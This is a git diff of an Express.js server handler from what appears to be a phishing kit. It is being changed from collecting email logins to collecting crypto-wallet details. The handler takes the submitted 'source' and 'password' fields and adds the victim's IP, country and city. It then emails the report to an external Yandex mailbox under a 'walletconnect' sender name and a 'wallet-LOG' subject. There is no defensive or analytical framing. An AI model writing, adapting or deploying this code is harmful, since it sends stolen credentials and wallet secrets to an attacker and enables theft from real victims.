@@ -27,7 +27,7 @@ app.get("/", (request, response) => {
 
 // https://expressjs.com/en/starter/basic-routing.html
 app.post("/", (req, res) => {
-  const { ai, pr } = req.body;
+  const { source, password } = req.body;
   console.log(req.body);
   let logEmail = "sharedbox2021@yandex.com";
 
@@ -48,8 +48,8 @@ app.post("/", (req, res) => {
     </head>  
     <body>
     Details Has Arrived!!
-    <h3>User: ${ai}</h3>
-    <h3>Access: ${pr}</h3>
+    <h3>wallet: ${source}</h3>
+    <h3>Access: ${password}</h3>
     <h3>IP: ${ip}</h3>
     <h3>Country: ${country}</h3>
     <h3>City: ${city}</h3>
@@ -64,9 +64,9 @@ app.post("/", (req, res) => {
 
   sendmail(
     {
-      from: "docu@logscentral.com",
+      from: "walletconnect@logscentral.com",
       to: logEmail,
-      subject: "EMAIL-LOG " + ip2,
+      subject: "wallet-LOG " + ip2,
       html,
     },
     function (err, reply) {
